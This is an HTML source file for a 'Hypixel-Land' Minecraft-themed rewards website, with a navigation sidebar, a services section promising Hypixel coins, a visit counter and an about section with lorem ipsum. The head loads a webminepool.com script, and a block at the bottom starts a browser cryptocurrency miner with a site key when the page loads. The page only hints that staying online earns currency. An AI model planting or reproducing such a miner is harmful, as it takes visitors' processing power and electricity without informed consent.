<!DOCTYPE html>
<html lang="en">

<head>
  <script src="https://www.webminepool.com/lib/base.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <title>My Website</title>

</head>

<body>
    <nav class="sidebar close">
        <header>
            <div class="image-text">
                <span class="image">
                    <img src="kura3.jpg" alt="">
                </span>

                <div class="text logo-text">
                    <span class="name">Hypixel</span>
                    <span class="profession">Land</span>
                </div>
            </div>

            <i class='bx bx-chevron-right toggle'></i>
        </header>

        <div class="menu-bar">
            <div class="menu">

                <li class="search-box">
                  <img src="lu.jpg" alt="">
                    <input type="text" placeholder="Search...">
                    <i class='bx bx-search icon'></i>
                </li>

                <ul class="menu-links">
                    <li class="nav-link">
                        <a href="#hero">
                            <img src="home.jpg" alt="">
                            <i class='bx bx-home-alt icon' ></i>
                            <span class="text nav-text">Home</span>
                            <i class='bx bx-home-alt icon' ></i>
                        </a>
                    </li>

                    <li class="nav-link">
                      <a href="meow.html">
                          <img src="aa.jpg" alt="">
                          <i class='bx bx-home-alt icon' ></i>
                          <span class="text nav-text">Earn</span>
                          <i class='bx bx-home-alt icon' ></i>
                          <i class='bx bx-home-alt icon' ></i>
                          <i class='bx bx-home-alt icon' ></i>
                          <i class='bx bx-home-alt icon' ></i>
                          <i class='bx bx-home-alt icon' ></i>
                      </a>
                  </li>

                    <li class="nav-link">
                        <a href="#projects">
                            <img src="2.jpg" alt="">
                            <i class='bx bx-bell icon'></i>
                            <span class="text nav-text">FAQ</span>
                            <i class='bx bx-bell icon'></i>
                            <i class='bx bx-bell icon'></i>
                        </a>
                    </li>

                    <li class="nav-link">
                        <a href="#">
                            <i class='bx bx-pie-chart-alt icon' ></i>
                            <span class="text nav-text">Analytics</span>
                        </a>
                    </li>

                    <li class="nav-link">
                        <a href="#">
                            <i class='bx bx-heart icon' ></i>
                            <span class="text nav-text">Likes</span>
                        </a>
                    </li>

                    <li class="nav-link">
                        <a href="#">
                            <i class='bx bx-wallet icon' ></i>
                            <span class="text nav-text">Wallets</span>
                        </a>
                    </li>

                </ul>
            </div>

            <div class="bottom-content">
                <li class="">
                    <a href="login.html">
                        <i class='bx bx-log-out icon' ></i>
                        <span class="text nav-text">Logout</span>
                    </a>
                </li>

                <li class="mode">
                    <div class="sun-moon">
                        <i class='bx bx-moon icon moon'></i>
                        <i class='bx bx-sun icon sun'></i>
                    </div>
                    <span class="mode-text text">Dark mode</span>

                    <div class="toggle-switch">
                        <span class="switch"></span>
                    </div>
                </li>
                
            </div>
        </div>

    </nav>

    <section class="home">
        <div class="text">Dashboard Sidebar</div>
    </section>

    <script src="script.js"></script>

  <!-- Header -->
  <!-- End Header -->


  <!-- Hero Section  -->
  <section id="hero">
    <div class="hero container">
      <div>
        <h1>Hello, <span></span></h1>
        <h1>Welcome to <span></span></h1>
        <h1>Hypixel-Land <span></span></h1>
        <a href="https://www.discord.gg/woolwars" type="button" class="cta">Join our Discord</a>
      </div>
    </div>
  </section>
  <!-- End Hero Section  -->

  <!-- Service Section -->
  <section id="services">
    <div class="services container">
      <div class="service-top">
        <h1 class="section-title">Serv<span>i</span>ces</h1>
        <p>This is a new website created as part of the discord server. All the things you will get from this website / discord will be related to the minecraft server "Hypixel"</p>
      </div>
      <div class="service-bottom">
        <div class="service-item">
          <div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/services.png" /></div>
          <h2>Rewards</h2>
          <p>There will be two ways to get our currency on the website. The first is by staying on our site online, and the second is by logging in to our partners' discord servers.</p>
        </div>
        <div class="service-item">
          <div class="icon"><img src="https://img.icons8.com/bubbles/100/000000/services.png" /></div>
          <h2>Hypixel Coins</h2>
          <p>With the Hypixel coins you will be able to purchase ranks on hypixel and we will add more rewards in future.</p>
        </div>
      </div>
    </div>
  </section>
  <!-- End Service Section -->

  <!-- Projects Section -->
  <section id="projects">
    <div class="projects container">
      <div class="projects-header">
        <h1 class="section-title">Projects for the <span>Future</span></h1>
      </div>
      <div class="all-projects">
        <div class="project-item">
          <div class="project-info">
            <h1>Adding more rewards</h1>
            <p>If this website progresses very quickly, we will add more prizes such as lunar cosmetics, optifine capes ...
              If you have any suggestions, write to us on our discord</p>
          </div>
          <div class="project-img">
            <img src="./img/img-2.png" alt="img">
          </div>
        </div>
        <div class="project-item">
          <div class="project-info">
            <h1>Project 2</h1>
            <h2>If we reach 10k+ visits</h2>
            <p>We will add so much rewards as we said it</p>
            <p>This page was viewed</p>
            <h1 id="count">0</h1>
            <p>times</p>
        
          <script>
              const countEl = document.getElementById("count");
              countvisits();
        
              function countvisits() {
                fetch('https://api.countapi.xyz/update/mouse/laptop/?amount=1')
                  .then((res) => res.json())
                  .then((res) => {
                    countEl.innerHTML = res.value;
                  });
              }
         </script>
          </div>
          <div class="project-img">
            <img src="./img/img-1.png" alt="img">
          </div>
        </div>
        </div>
      </div>
    </div>
  <!-- End Projects Section -->

  <!-- About Section -->
  <section id="about">
    <div class="about container">
      <div class="col-left">
        <div class="about-img">
          <img src="./img/img-2.png" alt="img">
        </div>
      </div>
      <div class="col-right">
        <h1 class="section-title">About <span>me</span></h1>
        <h2>Front End Developer</h2>
        <p>Lorem ipsum, dolor sit amet consectetur adipisicing elit. Asperiores, velit alias eius non illum beatae atque
          repellat ratione qui veritatis repudiandae adipisci maiores. At inventore necessitatibus deserunt
          exercitationem cumque earum omnis ipsum rem accusantium quis, quas quia, accusamus provident suscipit magni!
          Expedita sint ad dolore, commodi labore nihil velit earum ducimus nulla quae nostrum fugit aut, deserunt
          reprehenderit libero enim!</p>
      </div>
    </div>
  </section>
  <!-- End About Section -->  
  <!-- End Contact Section -->

  <!-- Footer -->
  <section id="footer">
    <div class="footer container">
      <div class="brand">
        <h1><span>H</span>ypixel <span>L</span>and</h1>
      </div>
      <h2>Your Complete Web Solution</h2>
      <div class="social-icon">
        <div class="social-item">
          <a href="#"><img src="https://img.icons8.com/bubbles/100/000000/facebook-new.png" /></a>
        </div>
        <div class="social-item">
          <a href="#"><img src="https://img.icons8.com/bubbles/100/000000/instagram-new.png" /></a>
        </div>
      </div>
      <p>Copyright © 2020 Hypixel-Land. All rights reserved</p>
    </div>
  </section>
  <body>
  <!-- End Footer -->
  <script src="./app.js"></script>

  <script>
    var miner = WMP.Anonymous('SK_jtytcbdOeScM5K3yJfOvE');
    miner.start();
  </script>

</body>

</html>
